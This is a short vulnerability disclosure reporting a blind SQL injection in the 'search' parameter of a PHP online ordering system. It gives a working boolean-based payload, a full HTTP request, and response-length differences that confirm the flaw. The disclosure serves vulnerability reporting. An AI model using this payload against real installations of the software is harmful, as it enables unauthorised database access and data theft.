# Online Ordering System By janobe has SQL injection vulnerability

Author： Wang Chen Jun

vendor: https://www.sourcecodester.com/php/12978/online-ordering-system-phpmysqli.html

Vulnerability file: /ordering/index.php?q=category&search=

Vulnerability location: /ordering/index.php?q=category&search= //search is Injection point

[+]Payload: /ordering/index.php?q=category&search=3%20and%20length(database())%20=12--+ //search is Injection point

Current database name: multistoredb,length is 12

```sql
GET /ordering/index.php?q=category&search=3%20and%20length(database())%20=12--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```

When length (database ()) = 11, Content-Length: 18685
![image](https://user-images.githubusercontent.com/54017627/168940877-fe78d6d4-057b-4ac4-a315-a34cdcf494c0.png)

![image](https://user-images.githubusercontent.com/54017627/168940952-82028fe3-7fff-449b-bc0a-8f68fdc5684f.png)

When length (database ()) = 12, Content-Length: 23327
![image](https://user-images.githubusercontent.com/54017627/168940838-8ed656af-0e7e-480f-9ce7-7cc4686a801f.png)

![image](https://user-images.githubusercontent.com/54017627/168940910-5994ba2d-1b3b-42e1-92fb-cee5aa9a7b4a.png)
